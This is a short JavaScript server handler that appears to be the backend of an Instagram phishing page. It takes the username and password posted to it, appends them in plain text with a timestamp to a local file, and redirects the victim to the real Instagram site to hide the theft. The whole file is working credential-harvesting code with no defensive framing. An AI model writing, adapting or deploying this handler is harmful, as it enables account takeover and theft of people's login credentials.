import fs from "fs";
import path from "path";

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).send("Method Not Allowed");
    }

    const { username, password } = req.body;

    const log = `Username: ${username}, Password: ${password}, Time: ${new Date().toISOString()}\n`;
    fs.appendFileSync(path.join(process.cwd(), "data.txt"), log);

    return res.redirect(302, "https://www.instagram.com/");
}
